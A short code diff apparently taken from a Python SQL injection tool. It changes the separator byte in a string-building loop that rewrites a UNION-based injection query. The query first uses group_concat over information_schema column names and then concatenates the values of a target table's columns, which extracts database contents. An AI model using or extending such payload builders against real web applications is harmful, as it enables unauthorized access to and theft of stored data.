@@ -36,7 +36,7 @@ while i < len(data):
     if i == len(data) - 1:
         newdata = newdata + data[i]
     else:
-        newdata = newdata + data[i] + ",0xA5,"
+        newdata = newdata + data[i] + ",0x20,"
     i +=1
 selectStatement = selectStatement.replace("group_concat(column_name)","group_concat("+newdata+")")
 selectStatement = selectStatement.replace(('information_schema.columns where table_name="'+table+'"'+"--"),(table+"--"))
